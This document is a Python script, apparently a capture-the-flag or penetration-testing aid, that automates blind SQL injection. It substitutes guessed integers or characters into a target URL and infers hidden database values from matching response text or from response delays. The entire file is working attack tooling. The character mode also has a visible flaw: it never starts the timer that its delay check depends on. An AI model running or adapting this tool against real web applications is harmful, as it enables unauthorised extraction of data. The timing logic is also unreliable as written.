import argparse
import json
import requests
import time

parser = argparse.ArgumentParser(description='Blind SQL Helper')
parser.add_argument('--mode', choices=['integer', 'character', 'character-all'], default='character')
parser.add_argument('--min', default=0, type=int)
parser.add_argument('--max', default=255, type=int)
parser.add_argument('--debug', action='store_true')
parser.add_argument('--cookies', type=json.loads)
parser.add_argument('--url', required=True)

def validate_detect(target):
	def init():
		pass
	def validate(r):
		return target in r.text
	return (init, validate)

parser.add_argument('--v-detect', type=validate_detect, metavar='string', action='append', dest='validators')

def validate_longer(gap):
	gap = float(gap)
	start = None
	def init():
		nonlocal start
		start = time.time()
	def validate(r):
		return time.time() - start > gap
	return (init, validate)

parser.add_argument('--v-longer', type=validate_longer, metavar='time', action='append', dest='validators')

args = parser.parse_args()

def init():
	for (init, validate) in args.validators:
		init()

def is_valid(result):
	for (init, validate) in args.validators:
		if not validate(result):
			return False
	return True

if args.mode == 'integer':
	now_min = args.min
	now_max = args.max

	while now_min <= now_max:
		t = (now_min + now_max) >> 1
		temp_url = args.url.replace('@@@', str(t))
		init()
		r = requests.get(temp_url, cookies=args.cookies)
		if args.debug:
			print(r.text)
		if is_valid(r):
			print('%d success' % t)
			now_min = t + 1
		else:
			print('%d fail' % t)
			now_max = t - 1
	print(now_min - 1)
elif args.mode == 'character' or args.mode == 'character-all':
	key = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	for c in key:
		temp_url = args.url.replace('@@@', c)
		r = requests.get(temp_url, cookies=args.cookies)
		if args.debug:
			print(r.text)
		if is_valid(r):
			print(c)
			if args.mode == 'character':
				break
		else:
			print('%c fail' % c)
